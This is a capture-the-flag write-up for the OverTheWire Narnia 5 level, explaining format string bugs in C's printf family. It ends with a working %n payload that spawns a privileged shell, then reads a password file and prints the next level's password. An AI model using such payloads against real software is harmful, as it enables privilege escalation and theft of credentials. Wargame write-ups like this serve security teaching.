---
title: "Narnia 5 - OverTheWire"
description: ""
categories: [Writeup]
tags: [narnia5, overthewire, format_strings, binary exploitation]
pubDate: 2021-04-16T12:19:38+03:00
draft: false
---

# Narnia 5 - OverTheWire

## Introduction

This level introduces what format string vulnerabilities are. A program is said to have a 
format string vulnerability if it pass unsensitized user input to one the `printf` family of
functions. These are as follows.

```c
#include <stdio.h>

int printf(const char *format, ...);
int fprintf(FILE *stream, const char *format, ...);
int dprintf(int fd, const char *format, ...);
int sprintf(char *str, const char *format, ...);
int snprintf(char *str, size_t size, const char *format, ...);

#include <stdarg.h>

int vprintf(const char *format, va_list ap);
int vfprintf(FILE *stream, const char *format, va_list ap);
int vdprintf(int fd, const char *format, va_list ap);
int vsprintf(char *str, const char *format, va_list ap);
int vsnprintf(char *str, size_t size, const char *format, va_list ap);
```

Or when the user input is directly given to the functions as the `format` parameter. Here is
an example.

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
    char input[10];
    
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return -1;
    }
    
    strncpy(input, argv[1], sizeof input);
    printf(input);

    return 0;
}
```

This code may look secure but it is not. The vulnerability lies in how we call the `printf`
function. Instead of calling it like `printf(input)` it should have been called like this 
`printf("%s", input)`. This is because of how the `printf` function works.

The `printf` family of functions have these placeholders for data types. For example we
have used one of these format specifiers, the `%s`, which tells the `printf` function
to expect a string. There are a bunch of them for all kinds of data types. Here are some
examples.

* `%s`: To specify strings
* `%d`: To specify integers
* `%f`: To specify floats
* `%u`: To specify unsigned integers
* `%p`: To specify pointers
* `%x`: To print the hex value

How `printf` works is when it encounters one of these format specifiers it assumes there is
a corresponding argument passed to it after the format string. So it takes what ever it
gets on the memory and it tries to make sense of it. You can test this with the previous program
by giving it a bunch of `%x`. The program will print a bunch of numbers. This are not random values
this are the hex representation of what the program found on the stack.

```
$ ./a.out "%x %x %x"
94a04550 0 25207825
```

If you take a closer look at the hex `25207825` it kinda seems odd thats because its in the range of
`ascii` characters and if you change it to its `string` representation you will get `% x%`, it is
reversed because of little endian. This means, in our case, the `3rd` format parameter is reading
from our input, this can be utilized to read and write to arbitrary memory more on this later.

## Examining Narnia5

The source code for `Narnia5` is as follows

```c
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv) {
    int i = 1;
    char buffer[64];

    snprintf(buffer, sizeof buffer, argv[1]);
    buffer[sizeof (buffer) - 1] = 0;
    printf("Change i's value from 1 -> 500. ");

    if(i == 500) {
        printf("GOOD\n");
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }

    printf("No way...let me give you a hint!\n");
    printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
    printf ("i = %d (%p)\n", i, &i);
    return 0;
```

This program will give us a shell if it finds the value of `i` to be `500` but there is no obvious 
way to set the value of `i` to `500`. If you look closely one of the `printf` family of functions
is being used, the `snprintf`. The signature for this function is as follows.

```c
int snprintf(char *str, size_t size, const char *format, ...);
```

Which means the user input, `argv[1]`, is directly given as a format string. We can test this by
giving the program a bunch of `%x` and observe the output. I also have put some `AAAA` to see which
format parameter reads from our input string.

```
$ ./narnia5 "AAAA%x %x %x %x %x"
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAA41414141 31343134 31343134 33313320 33313334] (48)
i = 1 (0xffffd6d0)
```

From the output we can see that the `1st` format parameter starts reading from our input string, hence
the `41`s which are hex representations of `A`s. For example if we were to put `%s` instead of `%x` the
program would crash because `%s` expects a pointer and when it tries to dereference `41414141` it 
won't find anything at that address.

```
$ ./narnia5 "AAAA%s"
Segmentation fault
```

With format strings we can also give paddings. Lets say we have the number `1234` and we want to print
it with 10 padding space i.e. "      1234". The first 4 are taken by the number it's self and the rest
6 are used as a padding which means if the number were to become `12345` the printed value would be
"     12345" there would be only 5 spaces.

You can achieve this by adding a number between the `%` sign and the letter that specifies the type of
the format parameter, `%10x`

Now where do we go with this. In addition to the previous format parameter discussed there is another
one the `%n` format parameter. While the other format parameters read this one writes.

The `%n` format parameter writes the length of what has already been printed to a variable. Lets 
see this with an example:

```c
#include <stdio.h>

int main() {
    int i = 0;
    
    printf("Hello World!!!%n\n", &i);
    printf("i: %d\n", i);

    return 0;
}
```

The output:

```
$ ./a.out
Hello World!!!
i:         14
```

## Exploiting

Now combining this we can set the value of `i` to `500` and get a shell. Every time the program is run
you can see the address of `i` being printed we can just leverage that. Oh and don't forget about
little endian. In our case the address of `i` was at `0xffffd6d0` which means in little endian format
it would be `\xd0\xd6\xff\xff` I've added the `\x` so that python would understand that this is 
hex value.

```
$ ./narnia5 "$(python -c 'print "AAAA\xd0\xd6\xff\xff%492x%n"')"
Change i's value from 1 -> 500. GOOD
$ cat /etc/narnia_pass/narnia6
neezocaeng
```

That's it, thank you for reading.
